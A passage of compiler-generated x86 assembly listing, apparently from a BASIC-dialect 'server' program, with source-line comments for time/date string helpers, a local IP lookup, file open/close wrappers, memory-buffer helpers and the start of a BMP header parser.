	push	[ebp+8]			;;; i674a
	call	_GetObjectType@4			;;; i619
	cmp	eax,7			;;; i684a
	jne	>> case.011D.0002.server			;;; i219
	mov	eax,2			;;; i659
	jmp	end.func41.server			;;; i258
;
; [2891] CASE ELSE 									: RETURN 0
	jmp	end.select.011D.server			;;; i69
case.011D.0002.server:
	mov	eax,0			;;; i659
	jmp	end.func41.server			;;; i258
;
; [2892] END SELECT
end.select.011D.server:
;
; [2894] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetImageType.server:  ;;; Function end label for Assembly Programmers.
end.func41.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  GetImageType ()  *****
;  *****
;
; [2896] FUNCTION STRING GetTime ()
.code
align 16
_GetTime.server@0:
;  *****
;  *****  FUNCTION  GetTime ()  *****
;  *****
func16.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.414:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.414			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,164			;;; i114a
;
funcBody16.server:
;
; [2898] GetLocalDateAndTime (year, month, day, weekDay, @hour, @minute, @second, nanos)
#ifdef GetTime.year
#undef GetTime.year
#endif
#define GetTime.year ebp-40	; exposes local variable 'year'
;
#ifdef GetTime.month
#undef GetTime.month
#endif
#define GetTime.month ebp-44	; exposes local variable 'month'
;
#ifdef GetTime.day
#undef GetTime.day
#endif
#define GetTime.day ebp-48	; exposes local variable 'day'
;
#ifdef GetTime.weekDay
#undef GetTime.weekDay
#endif
#define GetTime.weekDay ebp-52	; exposes local variable 'weekDay'
;
#ifdef GetTime.hour
#undef GetTime.hour
#endif
#define GetTime.hour ebp-56	; exposes local variable 'hour'
;
#ifdef GetTime.minute
#undef GetTime.minute
#endif
#define GetTime.minute ebp-60	; exposes local variable 'minute'
;
#ifdef GetTime.second
#undef GetTime.second
#endif
#define GetTime.second ebp-64	; exposes local variable 'second'
;
#ifdef GetTime.nanos
#undef GetTime.nanos
#endif
#define GetTime.nanos ebp-68	; exposes local variable 'nanos'
;
	push	[ebp-68]			;;; i674a
	push	[ebp-64]			;;; i674a
	push	[ebp-60]			;;; i674a
	push	[ebp-56]			;;; i674a
	push	[ebp-52]			;;; i674a
	push	[ebp-48]			;;; i674a
	push	[ebp-44]			;;; i674a
	push	[ebp-40]			;;; i674a
	call	func5E.server			;;; i619
	mov	ecx,d[esp-16]			;;; i877a
	mov	ebx,d[esp-12]			;;; i877b
	mov	edi,d[esp-8]			;;; i877c
	mov	d[ebp-56],ecx			;;; i670
	mov	d[ebp-60],ebx			;;; i670
	mov	d[ebp-64],edi			;;; i670
;
; [2899] RETURN STRING$(hour)+":"+STRING$(minute)+":"+STRING$(second)
	sub	esp,64			;;; i487
	mov	eax,d[ebp-56]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.0121.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
; .xstk16.0000 = ebp-76	; internal variable
	mov	[ebp-76],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[ebp-60]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-76]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0121.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-76],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[ebp-64]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-76]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	jmp	end.func16.server			;;; i258
;
; [2901] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetTime.server:  ;;; Function end label for Assembly Programmers.
end.func16.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
;-peep
;  *****
;  *****  END FUNCTION  GetTime ()  *****
;  *****
;
; [2904] FUNCTION STRING GetDate ()
.code
align 16
_GetDate.server@0:
;  *****
;  *****  FUNCTION  GetDate ()  *****
;  *****
func17.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.417:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.417			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,164			;;; i114a
;
funcBody17.server:
;
; [2906] GetLocalDateAndTime (@year, @month, @day, weekDay, hour, minute, second, nanos)
#ifdef GetDate.year
#undef GetDate.year
#endif
#define GetDate.year ebp-40	; exposes local variable 'year'
;
#ifdef GetDate.month
#undef GetDate.month
#endif
#define GetDate.month ebp-44	; exposes local variable 'month'
;
#ifdef GetDate.day
#undef GetDate.day
#endif
#define GetDate.day ebp-48	; exposes local variable 'day'
;
#ifdef GetDate.weekDay
#undef GetDate.weekDay
#endif
#define GetDate.weekDay ebp-52	; exposes local variable 'weekDay'
;
#ifdef GetDate.hour
#undef GetDate.hour
#endif
#define GetDate.hour ebp-56	; exposes local variable 'hour'
;
#ifdef GetDate.minute
#undef GetDate.minute
#endif
#define GetDate.minute ebp-60	; exposes local variable 'minute'
;
#ifdef GetDate.second
#undef GetDate.second
#endif
#define GetDate.second ebp-64	; exposes local variable 'second'
;
#ifdef GetDate.nanos
#undef GetDate.nanos
#endif
#define GetDate.nanos ebp-68	; exposes local variable 'nanos'
;
	push	[ebp-68]			;;; i674a
	push	[ebp-64]			;;; i674a
	push	[ebp-60]			;;; i674a
	push	[ebp-56]			;;; i674a
	push	[ebp-52]			;;; i674a
	push	[ebp-48]			;;; i674a
	push	[ebp-44]			;;; i674a
	push	[ebp-40]			;;; i674a
	call	func5E.server			;;; i619
	mov	ecx,d[esp-32]			;;; i877a
	mov	ebx,d[esp-28]			;;; i877b
	mov	edi,d[esp-24]			;;; i877c
	mov	d[ebp-40],ecx			;;; i670
	mov	d[ebp-44],ebx			;;; i670
	mov	d[ebp-48],edi			;;; i670
;
; [2907] RETURN STRING$(day)+"/"+STRING$(month)+"/"+STRING$(year)
	sub	esp,64			;;; i487
	mov	eax,d[ebp-48]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.02C7.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
; .xstk17.0000 = ebp-76	; internal variable
	mov	[ebp-76],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[ebp-44]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-76]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.02C7.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-76],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-76]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	jmp	end.func17.server			;;; i258
;
; [2909] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetDate.server:  ;;; Function end label for Assembly Programmers.
end.func17.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
;-peep
;  *****
;  *****  END FUNCTION  GetDate ()  *****
;  *****
;
; [2911] FUNCTION STRING GetLocalIpA ()
.code
align 16
_GetLocalIpA.server@0:
;  *****
;  *****  FUNCTION  GetLocalIpA ()  *****
;  *****
func15.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func15.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody15.server:
;
; [2914] name$ = NULL$(256)
#ifdef GetLocalIpA.name$
#undef GetLocalIpA.name$
#endif
#define GetLocalIpA.name$ ebp-40	; exposes local variable 'name$'
;
	sub	esp,64			;;; i487
	mov	d[esp],256
	call	%_null.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2915] gethostname (&name$,255)
;
; [0] EXTERNAL SFUNCTION  					gethostname      (addrSTRING, length)
	mov	eax,d[ebp-40]			;;; i642
; .xstk15.0000 = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
	push	255			;;; i656a
	push	[ebp-48]			;;; i674a
	call	_gethostname@8			;;; i619
;
; [2916] GetIPAddr (@name$, @ip$)
#ifdef GetLocalIpA.ip$
#undef GetLocalIpA.ip$
#endif
#define GetLocalIpA.ip$ ebp-52	; exposes local variable 'ip$'
;
	push	[ebp-52]			;;; i674a
	push	[ebp-40]			;;; i674a
	call	func7F.server			;;; i619
	mov	ecx,d[esp-8]			;;; i877a
	mov	ebx,d[esp-4]			;;; i877b
	mov	[ebp-40],ecx			;;; i670
	mov	[ebp-52],ebx			;;; i670
;
; [2917] RETURN ip$
	mov	eax,[ebp-52]			;;; i665
	call	%_clone.a0			;;; i870
	jmp	end.func15.server			;;; i258
;
; [2919] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetLocalIpA.server:  ;;; Function end label for Assembly Programmers.
end.func15.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func15.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
free.func15.server:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-52]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  GetLocalIpA ()  *****
;  *****
;
; [2921] FUNCTION open_file (pfilename, flags)
.code
;
#ifdef open_file.pfilename
#undef open_file.pfilename
#endif
#define open_file.pfilename ebp+8	; exposes function argument 'pfilename'
;
;
#ifdef open_file.flags
#undef open_file.flags
#endif
#define open_file.flags ebp+12	; exposes function argument 'flags'
;
align 16
_open_file.server@8:
;  *****
;  *****  FUNCTION  open_file ()  *****
;  *****
func49.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,196			;;; i114a
;
funcBody49.server:
;
; [2924] IFZ flags THEN
	mov	eax,d[ebp+12]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.011E.server			;;; i195
;
; [2925] type = &"rb"
#ifdef open_file.type
#undef open_file.type
#endif
#define open_file.type ebp-40	; exposes local variable 'type'
;
	mov	eax,addr @_string.05B0.server			;;; i642
	mov	d[ebp-40],eax			;;; i670
;
; [2926] ELSE
	jmp	end.if.011E.server			;;; i107
else.011E.server:
;
; [2927] type = flags
	mov	eax,d[ebp+12]			;;; i665
	mov	d[ebp-40],eax			;;; i670
;
; [2928] END IF
end.if.011E.server:
;
; [2930] in = fopen (pfilename, type)
#ifdef open_file.in
#undef open_file.in
#endif
#define open_file.in ebp-44	; exposes local variable 'in'
;
;
; [0] EXTERNAL CFUNCTION  fopen (filenameAddr, modeAddr)		' open a file whose name is the string pointed to by filename.
	push	[ebp-40]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	_fopen			;;; i619
	add	esp,8			;;; i633
	mov	d[ebp-44],eax			;;; i670
;
; [2931] IFZ (in)
	mov	eax,d[ebp-44]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.011F.server			;;; i195
;
; [2932] 'printf(&"\nunable to open file; '%s'\ncheck if path is correct.\n",pfilename)
;
; [2933] RETURN 0
	mov	eax,0			;;; i659
	jmp	end.func49.server			;;; i258
;
; [2934] ELSE
	jmp	end.if.011F.server			;;; i107
else.011F.server:
;
; [2935] RETURN in
	mov	eax,d[ebp-44]			;;; i665
	jmp	end.func49.server			;;; i258
;
; [2936] END IF
end.if.011F.server:
;
; [2938] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.open_file.server:  ;;; Function end label for Assembly Programmers.
end.func49.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  open_file ()  *****
;  *****
;
; [2940] FUNCTION close_file (file)
.code
;
#ifdef close_file.file
#undef close_file.file
#endif
#define close_file.file ebp+8	; exposes function argument 'file'
;
align 16
_close_file.server@4:
;  *****
;  *****  FUNCTION  close_file ()  *****
;  *****
func4A.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody4A.server:
;
; [2942] IF file THEN
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0120.server			;;; i221
;
; [2943] fclose (file)
;
; [0] EXTERNAL CFUNCTION  fclose (fpAddr)										' close the file fp
	push	[ebp+8]			;;; i674a
	call	_fclose			;;; i619
	add	esp,4			;;; i633
;
; [2944] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func4A.server			;;; i258
;
; [2945] ELSE
	jmp	end.if.0120.server			;;; i107
else.0120.server:
;
; [2946] 'printf(&"\nunable to close file",NULL)
;
; [2947] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func4A.server			;;; i258
;
; [2948] END IF
end.if.0120.server:
;
; [2950] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.close_file.server:  ;;; Function end label for Assembly Programmers.
end.func4A.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  close_file ()  *****
;  *****
;
; [2952] FUNCTION free_memory_space (hbuffer)
.code
;
#ifdef free_memory_space.hbuffer
#undef free_memory_space.hbuffer
#endif
#define free_memory_space.hbuffer ebp+8	; exposes function argument 'hbuffer'
;
align 16
_free_memory_space.server@4:
;  *****
;  *****  FUNCTION  free_memory_space ()  *****
;  *****
func4C.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody4C.server:
;
; [2953] SHARED STRING membuffer
data section 'globals$shared'
align	4
%membuffer.server:	db 4 dup ?
.code
;
; [2956] membuffer = ""
	xor	eax,eax			;;; i3
	mov	ebx,addr %membuffer.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2957] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func4C.server			;;; i258
;
; [2959] 'RETURN free (hbuffer)
;
; [2960] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.free_memory_space.server:  ;;; Function end label for Assembly Programmers.
end.func4C.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  free_memory_space ()  *****
;  *****
;
; [2962] FUNCTION create_memory_space (totalbytes)
.code
;
#ifdef create_memory_space.totalbytes
#undef create_memory_space.totalbytes
#endif
#define create_memory_space.totalbytes ebp+8	; exposes function argument 'totalbytes'
;
align 16
_create_memory_space.server@4:
;  *****
;  *****  FUNCTION  create_memory_space ()  *****
;  *****
func4B.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody4B.server:
;
; [2963] SHARED STRING membuffer
;
; [2966] IFZ totalbytes THEN RETURN 0
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0121.server			;;; i195
	mov	eax,0			;;; i659
	jmp	end.func4B.server			;;; i258
else.0121.server:
end.if.0121.server:
;
; [2967] membuffer = NULL$(totalbytes+1)
	sub	esp,64			;;; i487
	mov	eax,d[ebp+8]			;;; i665
	add	eax,1			;;; i775
	mov	d[esp],eax			;;; i887
	call	%_null.d			;;; i573
	add	esp,64			;;; i600
	mov	ebx,addr %membuffer.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2969] 'pbuffer = malloc (totalbytes)
;
; [2970] 'IFZ pbuffer THEN RETURN 0
;
; [2971] 'RtlZeroMemory (pbuffer, totalbytes)
;
; [2973] RETURN &membuffer
	mov	eax,d[%membuffer.server]			;;; i642
	jmp	end.func4B.server			;;; i258
;
; [2975] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.create_memory_space.server:  ;;; Function end label for Assembly Programmers.
end.func4B.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  create_memory_space ()  *****
;  *****
;
; [2977] FUNCTION GetImageArrayInfo (UBYTE image[], @bpp, @width, @height)
.code
;
#ifdef GetImageArrayInfo.image
#undef GetImageArrayInfo.image
#endif
#define GetImageArrayInfo.image ebp+8	; exposes function argument 'image'
;
;
#ifdef GetImageArrayInfo.bpp
#undef GetImageArrayInfo.bpp
#endif
#define GetImageArrayInfo.bpp ebp+12	; exposes function argument 'bpp'
;
;
#ifdef GetImageArrayInfo.width
#undef GetImageArrayInfo.width
#endif
#define GetImageArrayInfo.width ebp+16	; exposes function argument 'width'
;
;
#ifdef GetImageArrayInfo.height
#undef GetImageArrayInfo.height
#endif
#define GetImageArrayInfo.height ebp+20	; exposes function argument 'height'
;
align 16
_GetImageArrayInfo.server@16:
;  *****
;  *****  FUNCTION  GetImageArrayInfo ()  *****
;  *****
func40.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.435:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.435			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,104			;;; i114a
;
funcBody40.server:
;
; [2980] IFZ image[] THEN RETURN ($$FALSE)
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0122.server			;;; i195
	mov	eax,0			;;; i659
	jmp	end.func40.server			;;; i258
else.0122.server:
end.if.0122.server:
;
; [2981] bytes = SIZE (image[])
#ifdef GetImageArrayInfo.bytes
#undef GetImageArrayInfo.bytes
#endif
#define GetImageArrayInfo.bytes ebp-40	; exposes local variable 'bytes'
;
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i586
	jz	> A.430			;;; i587
	mov	esi,d[eax-4]			;;; i588
	mov	eax,d[eax-8]			;;; i589
	and	esi,65535			;;; i590
	imul	eax,esi			;;; i591
A.430:
	mov	d[ebp-40],eax			;;; i670
;
; [2982] iAddr = &image[]
#ifdef GetImageArrayInfo.iAddr
#undef GetImageArrayInfo.iAddr
#endif
#define GetImageArrayInfo.iAddr ebp-44	; exposes local variable 'iAddr'
;
	mov	eax,d[ebp+8]			;;; i665
	mov	d[ebp-44],eax			;;; i670
;
; [2983] '
;
; [2984] IF (bytes < 32) THEN RETURN ($$FALSE)
	mov	eax,d[ebp-40]			;;; i665
	cmp	eax,32			;;; i684a
	jge	>> else.0123.server			;;; i219
	mov	eax,0			;;; i659
	jmp	end.func40.server			;;; i258
else.0123.server:
end.if.0123.server:
;
; [2985] '
;
; [2986] byte0 = image[0]
#ifdef GetImageArrayInfo.byte0
#undef GetImageArrayInfo.byte0
#endif
#define GetImageArrayInfo.byte0 ebp-48	; exposes local variable 'byte0'
;
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx]			;;; i464
	mov	d[ebp-48],eax			;;; i670
;
; [2987] byte1 = image[1]
#ifdef GetImageArrayInfo.byte1
#undef GetImageArrayInfo.byte1
#endif
#define GetImageArrayInfo.byte1 ebp-52	; exposes local variable 'byte1'
;
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+1]			;;; i464
	mov	d[ebp-52],eax			;;; i670
;
; [2988] '
;
; [2989] IF ((byte0 != 'B') OR (byte1 != 'M')) THEN RETURN ($$FALSE)
	mov	eax,d[ebp-48]			;;; i665
	cmp	eax,66			;;; i684a
;>peep
	mov	eax,0			;;; i466
	je	> A.431			;;; i467
	not	eax			;;; i468
A.431:
;+peep
	mov	ebx,d[ebp-52]			;;; i665
	cmp	ebx,77			;;; i684a
;>peep
	mov	ebx,0			;;; i466
	je	> A.432			;;; i467
	not	ebx			;;; i468
A.432:
;+peep
	or	eax,ebx			;;; i763
	test	eax,eax			;;; i220
	jz	>> else.0124.server			;;; i221
	mov	eax,0			;;; i659
	jmp	end.func40.server			;;; i258
else.0124.server:
end.if.0124.server:
;
; [2991] byte2 = image[2]
#ifdef GetImageArrayInfo.byte2
#undef GetImageArrayInfo.byte2
#endif
#define GetImageArrayInfo.byte2 ebp-56	; exposes local variable 'byte2'
;
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+2]			;;; i464
	mov	d[ebp-56],eax			;;; i670
;
; [2992] byte3 = image[3]
#ifdef GetImageArrayInfo.byte3
#undef GetImageArrayInfo.byte3
#endif
#define GetImageArrayInfo.byte3 ebp-60	; exposes local variable 'byte3'
;
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+3]			;;; i464
	mov	d[ebp-60],eax			;;; i670
;
; [2993] byte4 = image[4]
#ifdef GetImageArrayInfo.byte4
#undef GetImageArrayInfo.byte4
#endif
#define GetImageArrayInfo.byte4 ebp-64	; exposes local variable 'byte4'
;
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+4]			;;; i464
	mov	d[ebp-64],eax			;;; i670
;
; [2994] byte5 = image[5]
#ifdef GetImageArrayInfo.byte5
#undef GetImageArrayInfo.byte5
#endif
#define GetImageArrayInfo.byte5 ebp-68	; exposes local variable 'byte5'
;
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+5]			;;; i464
	mov	d[ebp-68],eax			;;; i670
;
; [2995] fileSize = (byte5 << 24) OR (byte4 << 16) OR (byte3 << 8) OR byte2
#ifdef GetImageArrayInfo.fileSize
#undef GetImageArrayInfo.fileSize
#endif
#define GetImageArrayInfo.fileSize ebp-72	; exposes local variable 'fileSize'
;
	mov	eax,d[ebp-68]			;;; i665
	shl	eax,24			;;; i835
	mov	ebx,d[ebp-64]			;;; i665
	shl	ebx,16			;;; i835
	or	eax,ebx			;;; i763
	mov	ebx,d[ebp-60]			;;; i665
	shl	ebx,8			;;; i835
	or	eax,ebx			;;; i763
	mov	ebx,d[ebp-56]			;;; i665
	or	eax,ebx			;;; i763
	mov	d[ebp-72],eax			;;; i670
;
; [2996] '
;
; [2997] byte14 = image[14]
#ifdef GetImageArrayInfo.byte14
#undef GetImageArrayInfo.byte14
#endif
#define GetImageArrayInfo.byte14 ebp-76	; exposes local variable 'byte14'
;
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+14]			;;; i464
	mov	d[ebp-76],eax			;;; i670
;
; [2998] byte15 = image[15]
#ifdef GetImageArrayInfo.byte15
#undef GetImageArrayInfo.byte15
#endif
#define GetImageArrayInfo.byte15 ebp-80	; exposes local variable 'byte15'
;
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+15]			;;; i464
	mov	d[ebp-80],eax			;;; i670
;
; [2999] byte16 = image[16]
#ifdef GetImageArrayInfo.byte16
#undef GetImageArrayInfo.byte16
#endif
#define GetImageArrayInfo.byte16 ebp-84	; exposes local variable 'byte16'
;
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+16]			;;; i464
	mov	d[ebp-84],eax			;;; i670
;
; [3000] byte17 = image[17]
#ifdef GetImageArrayInfo.byte17
#undef GetImageArrayInfo.byte17
#endif
#define GetImageArrayInfo.byte17 ebp-88	; exposes local variable 'byte17'
;
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+17]			;;; i464
	mov	d[ebp-88],eax			;;; i670
;
; [3001] headerSize = (byte17 << 24) OR (byte16 << 16) OR (byte15 << 8) OR byte14
#ifdef GetImageArrayInfo.headerSize
#undef GetImageArrayInfo.headerSize
#endif
#define GetImageArrayInfo.headerSize ebp-92	; exposes local variable 'headerSize'
;
	mov	eax,d[ebp-88]			;;; i665
	shl	eax,24			;;; i835
	mov	ebx,d[ebp-84]			;;; i665
	shl	ebx,16			;;; i835
	or	eax,ebx			;;; i763
